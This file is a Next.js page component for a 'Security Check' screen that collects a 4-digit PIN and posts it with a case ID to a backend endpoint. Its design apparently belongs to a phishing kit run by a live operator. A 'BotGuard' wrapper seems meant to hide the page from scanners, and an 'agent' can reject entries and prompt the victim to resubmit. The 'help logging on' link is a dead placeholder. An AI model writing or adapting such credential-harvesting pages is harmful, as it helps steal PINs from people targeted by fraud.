'use client';

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { status, loading, error, caseId, agentMessage } = useSessionStore();

  const [pin, setPin] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  /**
   * Listen for agent rejections and show error
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setPin('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  // Handle form submission
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!pin.trim()) {
        setFieldError('Please enter your PIN');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: pin,
          }),
        });

        if (!response.ok) {
          setFieldError('Unable to verify PIN. Please try again.');
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your PIN...',
          formData: { secretKey: pin },
        });

      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
      } finally {
        setIsSubmitting(false);
      }
    },
    [pin, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting;

  return (
    <BotGuard>
      <div className="login-card">
        <h1 className="login-title">Security Check</h1>

        {isWaiting ? (
          <div className="login-form">
            <div className="waiting-container">
              <div className="spinner-container">
                <div className="loading-spinner"></div>
              </div>
              <p className="waiting-title">
                Verifying PIN...
              </p>
              <p className="waiting-text">
                Please wait while we verify your security information.
              </p>
            </div>
          </div>
        ) : (
          <form className="login-form" onSubmit={handleSubmit} noValidate>
            <div className="form-step">
              <p className="page-description-left">
                For your security, please enter your PIN.
              </p>

              <div className={`form-field-wrapper ${fieldError ? 'has-error' : ''}`}>
                <label htmlFor="pin" className="form-label">PIN</label>
                <input
                  type="password"
                  id="pin"
                  name="pin"
                  className="form-input"
                  value={pin}
                  onChange={(e) => {
                    setPin(e.target.value);
                    if (fieldError) setFieldError('');
                  }}
                  maxLength={4}
                  required
                />
              </div>

              {/* Error Message */}
              {fieldError && (
                <div className="urgent-alert">
                  <div className="urgent-alert-icon">
                    <svg viewBox="0 0 24 24" fill="currentColor" width="24" height="24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                    </svg>
                  </div>
                  <div className="urgent-alert-content">
                    <div className="urgent-alert-title">System Message</div>
                    <div className="urgent-alert-message">{fieldError}</div>
                  </div>
                </div>
              )}

              <button type="submit" className="btn-primary">
                Submit
              </button>
            </div>
          </form>
        )}

        <a href="#" className="help-link">I need help logging on</a>
      </div>
    </BotGuard>
  );
}
